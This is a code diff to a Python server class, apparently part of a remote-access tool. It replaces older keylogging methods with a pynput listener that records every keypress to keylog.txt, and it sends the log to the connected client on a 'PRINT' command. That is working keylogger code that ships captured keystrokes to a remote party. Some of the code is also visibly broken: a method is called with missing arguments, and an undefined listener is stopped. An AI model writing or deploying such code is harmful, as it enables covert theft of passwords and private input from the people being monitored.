@@ -12,7 +12,7 @@ import psutil
 from ipaddress import ip_address
 from contextlib import closing
 import tkinter as tk
-import pynput.keyboard
+from pynput import keyboard
 import Program
 import Keylog
 from tkinter import *
@@ -295,40 +295,60 @@ class Server:
     #                     res = "Error"
     #             self.send_response(conn, res)
 
-    def hookKey(self):
-        self.tklog.resume()
-        open(Keylog.path, "w").close()
+    # def hookKey(self):
+    #     self.tklog.resume()
+    #     open(Keylog.path, "w").close()
 
-    def unhook(self):
-        self.tklog.suspend()
+    # def unhook(self):
+    #     self.tklog.suspend()
 
-    def printkeys(self):
-        s = ""
-        with open(Keylog.path, "r") as file:
-            s = file.read()
-        open(Keylog.path, "w").close()
-        if not s:
-            s = "\0"
-        self.nw.write(s)
-        self.nw.flush()
+    # def printkeys(self):
+    #     s = ""
+    #     with open(Keylog.path, "r") as file:
+    #         s = file.read()
+    #     open(Keylog.path, "w").close()
+    #     if not s:
+    #         s = "\0"
+    #     self.nw.write(s)
+    #     self.nw.flush()
 
+    def start_keylog (self, conn):
+        with keyboard.Listener(on_press = self.on_key_press) as listener:
+                listener.join()
+    
+    def on_key_press(self, key):
+        try:
+            key_str = str(key.char)
+            self.write2logfile(key_str)
+        except AttributeError:
+            pass
+    
+    def write2logfile(self, key_str):
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(key_str)
+            
+    def read_log_file (self):
+        with open ("keylog.txt", "r") as log_file:
+            return log_file.read()
+        
+    def stop_keylog (self):
+        self.listener.stop()
+        pass
+    
     def keylog(self, conn):
         self.tklog = threading.Thread(target=Keylog.startKLog)
-        self.keylog_event = threading.Event()
-        s = ""
         self.tklog.start()
-        self.keylog_event.wait()
         while True:
             s = self.receiveSignal()
             if s == "PRINT":
-                self.printkeys()
+                data = self.read_log_file()
+                self.clients.send(data.encode())
             elif s == "HOOK":
-                self.hookKey()
-                self.keylog_event.set()
+                self.start_keylog()
             elif s == "UNHOOK":
-                self.unhook()
-                self.keylog_event.clear()
+                self.stop_keylog()
             elif s == "QUIT":
+                self.clients.close()
                 return
 
     def receiveSignal(self, conn):
